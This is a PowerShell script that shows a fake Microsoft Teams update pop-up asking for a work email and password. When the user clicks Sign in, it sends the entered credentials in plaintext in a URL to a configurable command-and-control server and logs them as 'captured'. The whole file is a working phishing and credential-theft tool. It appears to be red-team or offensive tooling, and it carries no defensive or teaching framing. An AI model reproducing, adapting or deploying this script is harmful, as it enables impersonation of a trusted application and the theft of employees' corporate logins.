Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Load Windows Runtime types
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime] | Out-Null

# Configuration
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"
$C2URL = "http://127.0.0.1:8080"
$TeamsIconPath = ".\teams.ico"

# Function to load Teams icon from current directory (no fallback)
function Load-TeamsIconImage {
    param($IconPath)
    
    Write-Host "[*] Checking for teams.ico in current directory..." -ForegroundColor White
    
    if (-not (Test-Path $IconPath)) {
        Write-Host "[!] teams.ico not found - no icon will be displayed" -ForegroundColor Yellow
        return $null
    }
    
    try {
        $fullPath = (Resolve-Path $IconPath).Path
        Write-Host "[*] Loading icon from: $fullPath" -ForegroundColor White
        
        $image = [System.Drawing.Image]::FromFile($fullPath)
        Write-Host "[+] Successfully loaded authentic Teams icon!" -ForegroundColor Green
        return $image
    } catch {
        Write-Host "[!] Failed to load teams.ico: $_" -ForegroundColor Red
        
        # Try alternative method
        try {
            $bitmap = New-Object System.Drawing.Bitmap($fullPath)
            Write-Host "[+] Icon loaded via Bitmap method" -ForegroundColor Green
            return $bitmap
        } catch {
            Write-Host "[!] All icon loading methods failed" -ForegroundColor Red
            return $null
        }
    }
}

# Function to create authentic Teams popup
function Show-AuthenticTeamsPopup {
    try {
        # Create form
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Microsoft Teams"
        $form.Size = New-Object System.Drawing.Size(380, 280)
        $form.FormBorderStyle = "None"
        $form.StartPosition = "Manual"
        $form.TopMost = $true
        $form.ShowInTaskbar = $false
        $form.KeyPreview = $true
        
        # Position in bottom-right corner
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $form.Location = New-Object System.Drawing.Point(
            ($screen.WorkingArea.Width - $form.Width - 20),
            ($screen.WorkingArea.Height - $form.Height - 20)
        )
        
        # Modern dark background
        $form.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
        
        # Header panel
        $headerPanel = New-Object System.Windows.Forms.Panel
        $headerPanel.Location = New-Object System.Drawing.Point(0, 0)
        $headerPanel.Size = New-Object System.Drawing.Size(380, 80)
        $headerPanel.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
        
        # Load Teams icon (no fallback)
        $teamsIcon = Load-TeamsIconImage -IconPath $TeamsIconPath
        $iconControl = $null
        
        if ($teamsIcon -ne $null) {
            # Use authentic Teams icon
            $iconPictureBox = New-Object System.Windows.Forms.PictureBox
            $iconPictureBox.Location = New-Object System.Drawing.Point(20, 20)
            $iconPictureBox.Size = New-Object System.Drawing.Size(40, 40)
            $iconPictureBox.SizeMode = "StretchImage"
            $iconPictureBox.Image = $teamsIcon
            $iconPictureBox.BackColor = [System.Drawing.Color]::Transparent
            $iconControl = $iconPictureBox
            
            Write-Host "[+] Using authentic Teams icon" -ForegroundColor Green
        } else {
            Write-Host "[*] No icon will be displayed" -ForegroundColor White
        }
        
        # Title (position adjusted based on icon presence)
        $titleLabel = New-Object System.Windows.Forms.Label
        if ($iconControl -eq $null) {
            $titleLabel.Location = New-Object System.Drawing.Point(20, 20)
        } else {
            $titleLabel.Location = New-Object System.Drawing.Point(75, 20)
        }
        $titleLabel.Size = New-Object System.Drawing.Size(200, 20)
        $titleLabel.Text = "Microsoft Teams"
        $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
        $titleLabel.ForeColor = [System.Drawing.Color]::White
        $titleLabel.BackColor = [System.Drawing.Color]::Transparent
        
        # Subtitle (position adjusted based on icon presence)
        $subtitleLabel = New-Object System.Windows.Forms.Label
        if ($iconControl -eq $null) {
            $subtitleLabel.Location = New-Object System.Drawing.Point(20, 45)
        } else {
            $subtitleLabel.Location = New-Object System.Drawing.Point(75, 45)
        }
        $subtitleLabel.Size = New-Object System.Drawing.Size(250, 30)
        $subtitleLabel.Text = "Microsoft Teams Update. Sign in to initiate the update in the background"
        $subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
        $subtitleLabel.BackColor = [System.Drawing.Color]::Transparent
        
        # Menu button (three dots)
        $menuButton = New-Object System.Windows.Forms.Button
        $menuButton.Location = New-Object System.Drawing.Point(305, 10)
        $menuButton.Size = New-Object System.Drawing.Size(30, 30)
        $menuButton.Text = "..."
        $menuButton.Font = New-Object System.Drawing.Font("Segoe UI", 14)
        $menuButton.ForeColor = [System.Drawing.Color]::FromArgb(160, 160, 160)
        $menuButton.BackColor = [System.Drawing.Color]::Transparent
        $menuButton.FlatStyle = "Flat"
        $menuButton.FlatAppearance.BorderSize = 0
        $menuButton.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
        $menuButton.Cursor = [System.Windows.Forms.Cursors]::Hand
        
        # Close button (X) - Authentic Teams styling
        $closeButton = New-Object System.Windows.Forms.Button
        $closeButton.Location = New-Object System.Drawing.Point(340, 10)
        $closeButton.Size = New-Object System.Drawing.Size(30, 30)
        $closeButton.Text = "X"
        $closeButton.Font = New-Object System.Drawing.Font("Segoe UI", 12)
        $closeButton.ForeColor = [System.Drawing.Color]::FromArgb(160, 160, 160)
        $closeButton.BackColor = [System.Drawing.Color]::Transparent
        $closeButton.FlatStyle = "Flat"
        $closeButton.FlatAppearance.BorderSize = 0
        $closeButton.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(196, 43, 28)
        $closeButton.FlatAppearance.MouseDownBackColor = [System.Drawing.Color]::FromArgb(166, 23, 8)
        $closeButton.Cursor = [System.Windows.Forms.Cursors]::Hand
        
        # Content area
        $contentPanel = New-Object System.Windows.Forms.Panel
        $contentPanel.Location = New-Object System.Drawing.Point(0, 80)
        $contentPanel.Size = New-Object System.Drawing.Size(380, 200)
        $contentPanel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
        
        # Work email field
        $emailLabel = New-Object System.Windows.Forms.Label
        $emailLabel.Location = New-Object System.Drawing.Point(20, 20)
        $emailLabel.Size = New-Object System.Drawing.Size(100, 20)
        $emailLabel.Text = "Work email"
        $emailLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $emailLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
        $emailLabel.BackColor = [System.Drawing.Color]::Transparent
        
        $emailBox = New-Object System.Windows.Forms.TextBox
        $emailBox.Location = New-Object System.Drawing.Point(20, 45)
        $emailBox.Size = New-Object System.Drawing.Size(340, 30)
        $emailBox.Font = New-Object System.Drawing.Font("Segoe UI", 11)
        $emailBox.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
        $emailBox.ForeColor = [System.Drawing.Color]::White
        $emailBox.BorderStyle = "FixedSingle"
        
        # Password field
        $passLabel = New-Object System.Windows.Forms.Label
        $passLabel.Location = New-Object System.Drawing.Point(20, 85)
        $passLabel.Size = New-Object System.Drawing.Size(100, 20)
        $passLabel.Text = "Password"
        $passLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $passLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
        $passLabel.BackColor = [System.Drawing.Color]::Transparent
        
        $passBox = New-Object System.Windows.Forms.TextBox
        $passBox.Location = New-Object System.Drawing.Point(20, 110)
        $passBox.Size = New-Object System.Drawing.Size(260, 30)
        $passBox.Font = New-Object System.Drawing.Font("Segoe UI", 11)
        $passBox.PasswordChar = "*"
        $passBox.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 35)
        $passBox.ForeColor = [System.Drawing.Color]::White
        $passBox.BorderStyle = "FixedSingle"
        
        # Sign in button
        $signInButton = New-Object System.Windows.Forms.Button
        $signInButton.Location = New-Object System.Drawing.Point(290, 110)
        $signInButton.Size = New-Object System.Drawing.Size(70, 30)
        $signInButton.Text = "Sign in"
        $signInButton.BackColor = [System.Drawing.Color]::FromArgb(109, 109, 255)
        $signInButton.ForeColor = [System.Drawing.Color]::White
        $signInButton.FlatStyle = "Flat"
        $signInButton.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $signInButton.FlatAppearance.BorderSize = 0
        $signInButton.Cursor = [System.Windows.Forms.Cursors]::Hand
        
        # Dismiss button
        $dismissButton = New-Object System.Windows.Forms.Button
        $dismissButton.Location = New-Object System.Drawing.Point(20, 155)
        $dismissButton.Size = New-Object System.Drawing.Size(340, 35)
        $dismissButton.Text = "Dismiss"
        $dismissButton.BackColor = [System.Drawing.Color]::FromArgb(0, 168, 255)
        $dismissButton.ForeColor = [System.Drawing.Color]::White
        $dismissButton.FlatStyle = "Flat"
        $dismissButton.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $dismissButton.FlatAppearance.BorderSize = 0
        $dismissButton.Cursor = [System.Windows.Forms.Cursors]::Hand
        
        # Event handlers
        $signInButton.Add_Click({
            try {
                $user = $emailBox.Text.Trim()
                $pass = $passBox.Text
                
                if ($user -and $pass) {
                    try {
                        $getUrl = "$C2URL/creds?user=$user&pass=$pass"
                        
                        Write-Host "[+] CREDENTIALS CAPTURED: $user / $pass" -ForegroundColor Green
                        
                        $response = Invoke-WebRequest -Uri $getUrl -Method GET -UseBasicParsing -TimeoutSec 5
                        
                        if ($response.StatusCode -eq 200) {
                            Write-Host "[+] Credentials exfiltrated to C2!" -ForegroundColor Green
                        }
                        
                    } catch {
                        Write-Host "[-] C2 failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    
                    $signInButton.Text = "Signing in..."
                    $signInButton.Enabled = $false
                    $signInButton.BackColor = [System.Drawing.Color]::FromArgb(16, 124, 16)
                    [System.Windows.Forms.Application]::DoEvents()
                    
                    Start-Sleep -Milliseconds 2000
                    $form.Close()
                    
                } else {
                    $signInButton.BackColor = [System.Drawing.Color]::Red
                    [System.Windows.Forms.Application]::DoEvents()
                    Start-Sleep -Milliseconds 300
                    $signInButton.BackColor = [System.Drawing.Color]::FromArgb(109, 109, 255)
                }
            } catch {
                Write-Host "[-] Sign in error: $_" -ForegroundColor Red
            }
        })
        
        $dismissButton.Add_Click({
            Write-Host "[*] User dismissed notification" -ForegroundColor Yellow
            $form.Close()
        })
        
        $closeButton.Add_Click({
            Write-Host "[*] User closed notification" -ForegroundColor Yellow
            $form.Close()
        })
        
        # Close button hover effects
        $closeButton.Add_MouseEnter({
            $closeButton.BackColor = [System.Drawing.Color]::FromArgb(196, 43, 28)
            $closeButton.ForeColor = [System.Drawing.Color]::White
        })
        
        $closeButton.Add_MouseLeave({
            $closeButton.BackColor = [System.Drawing.Color]::Transparent
            $closeButton.ForeColor = [System.Drawing.Color]::FromArgb(160, 160, 160)
        })
        
        # Form key handling
        $form.Add_KeyDown({
            if ($_.KeyCode -eq "Escape") {
                $form.Close()
            }
        })
        
        # Navigation
        $emailBox.Add_KeyDown({
            if ($_.KeyCode -eq "Enter") {
                $passBox.Focus()
            }
        })
        
        $passBox.Add_KeyDown({
            if ($_.KeyCode -eq "Enter") {
                $signInButton.PerformClick()
            }
        })
        
        # Add controls to header
        $controlsToAdd = @($titleLabel, $subtitleLabel, $menuButton, $closeButton)
        if ($iconControl -ne $null) {
            $controlsToAdd = @($iconControl) + $controlsToAdd
        }
        $headerPanel.Controls.AddRange($controlsToAdd)
        
        # Add content controls
        $contentPanel.Controls.AddRange(@($emailLabel, $emailBox, $passLabel, $passBox, $signInButton, $dismissButton))
        $form.Controls.AddRange(@($headerPanel, $contentPanel))
        
        # Show form
        Write-Host "[+] Displaying Teams popup..." -ForegroundColor Green
        $form.Show()
        $form.Activate()
        $form.BringToFront()
        $emailBox.Focus()
        
        # Event loop
        while ($form.Visible) {
            [System.Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 100
        }
        
    } catch {
        Write-Host "[-] Popup creation failed: $_" -ForegroundColor Red
    }
}

# Main execution
Write-Host "[*] Starting authentic Teams notification (no fallbacks)..." -ForegroundColor Cyan
Write-Host "[*] C2 Server: $C2URL" -ForegroundColor Yellow

Show-AuthenticTeamsPopup

Write-Host "`n[*] Teams phishing completed" -ForegroundColor Cyan
Write-Host "[*] Authentic branding only - no fallbacks used" -ForegroundColor Green
